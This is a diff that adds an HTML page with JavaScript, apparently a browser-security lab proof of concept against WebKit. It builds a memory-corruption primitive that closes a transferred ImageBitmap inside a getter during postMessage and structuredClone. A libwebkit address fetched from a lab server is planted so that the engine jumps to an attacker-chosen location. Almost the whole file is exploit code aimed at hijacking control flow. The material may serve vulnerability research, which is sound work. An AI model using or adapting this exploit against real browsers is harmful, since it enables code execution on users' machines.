@@ -1,0 +1,76 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>vcall — plant a *real* module address in the docs/94 slot and see where the engine jumps</title>
+<body><p id="p">vcall</p>
+<script>
+// docs/104.  The slot's pointer is page-chosen but its low byte is forced to 0x00 (the stream's length MSB
+// sits at element+8), so only 256-aligned targets are expressible.  This page does not guess: it fetches the
+// address from the lab server, which computes it from the live /proc/<pid>/maps of THIS run, so the value is a
+// genuine address of the loaded libwebkit.
+//
+// The engine loads *(value) and calls it (ImageBuffer.cpp:119).  Therefore:
+//   - plant a location whose qword is a code address -> the engine *executes* an address we chose
+//   - the ASAN report names where it went, and two different offsets give two different targets
+// That is indirect control flow through page bytes, which is the exploit-relevant half of docs/94.
+//
+// knobs: live=1 (must fetch), tmo=<ms> poll budget
+(function () {
+  'use strict';
+  function B(m, x) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)) + (x ? '&' + x : ''); } catch (e) {} }
+  var Q = new URLSearchParams(location.search);
+  var TMO = parseInt(Q.get('tmo') || '12000', 10);
+
+  function fetchPtr(cb, tries) {
+    tries = tries || 0;
+    fetch('/live/ptr.txt?t=' + Date.now(), { cache: 'no-store' }).then(function (r) {
+      return r.ok ? r.text() : '';
+    }).then(function (t) {
+      t = (t || '').trim();
+      if (/^0x[0-9a-f]+$/i.test(t)) return cb(parseInt(t, 16));
+      if (tries * 250 < TMO) return setTimeout(function () { fetchPtr(cb, tries + 1); }, 250);
+      B('noptr', 'tries=' + tries);
+    }, function () {
+      if (tries * 250 < TMO) return setTimeout(function () { fetchPtr(cb, tries + 1); }, 250);
+      B('noptr', 'tries=' + tries);
+    });
+  }
+
+  function unitsOf(ptr) {
+    // pointer -> 4 UTF-16 units, little-endian, low byte 0x00 by construction
+    if (ptr % 256 !== 0) return null;
+    var b = [];
+    for (var i = 0; i < 8; i++) b.push(Math.floor(ptr / Math.pow(2, 8 * i)) & 0xff);
+    if (b[0] !== 0) return null;
+    return [b[1] | (b[2] << 8), b[3] | (b[4] << 8), b[5] | (b[6] << 8), b[7]];
+  }
+
+  function run(ptr) {
+    var u = unitsOf(ptr);
+    if (!u) { B('badptr', 'p=0x' + ptr.toString(16)); return; }
+    var ss = String.fromCharCode(u[0], u[1], u[2], u[3], 0x0100);   // 5th unit forces 16-bit
+    B('cl', 'p=0x' + ptr.toString(16) + '&u=' + u.map(function (v) { return v.toString(16); }).join('.'));
+    var cvs = document.createElement('canvas'); cvs.width = 4; cvs.height = 4;
+    createImageBitmap(cvs).then(function (bmp) {
+      var ch = new MessageChannel(), got = false;
+      ch.port2.onmessage = function (ev) {
+        if (got) return; got = true;
+        var d = ev.data, b = d && d.k, w = -1, h = -1;
+        try { w = b ? b.width : -1; h = b ? b.height : -1; } catch (e) {}
+        B('rx', 'p=0x' + ptr.toString(16) + '&det=' + (b ? 0 : -1) + '&w=' + w + '&h=' + h);
+      };
+      var msg = { pad: 'x'.repeat(200), k: bmp };
+      msg.g = { get z() {
+        try { bmp.close(); } catch (e) {}
+        var o = structuredClone(ss);
+        return o.length;
+      } };
+      try { ch.port1.postMessage(msg, [bmp]); B('posted', 'p=0x' + ptr.toString(16)); }
+      catch (e) { B('postfail', 'e=' + e.name); }
+      setTimeout(function () { if (!got) B('to', 'p=0x' + ptr.toString(16)); }, 3000);
+    }, function (e) { B('bmpfail', 'e=' + (e && e.name)); });
+  }
+
+  fetchPtr(run);
+})();
+</script>
+</body>
